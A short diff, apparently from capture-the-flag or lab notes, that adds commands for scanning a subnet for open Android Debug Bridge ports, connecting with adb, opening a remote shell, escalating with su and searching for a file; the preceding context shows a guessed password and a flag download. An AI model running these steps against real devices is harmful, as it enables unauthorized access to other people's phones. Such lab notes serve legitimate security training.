@@ -172,3 +172,14 @@ jason
 qwerty
 get Flag.txt
 ```
+```console
+android
+
+nmap -p5555 10.10.1.3-254 --open
+adb connect 10.10.1.14:5555
+adb devices
+adb shell
+
+su
+find / -name images.jpeg 2> /dev/null
+```
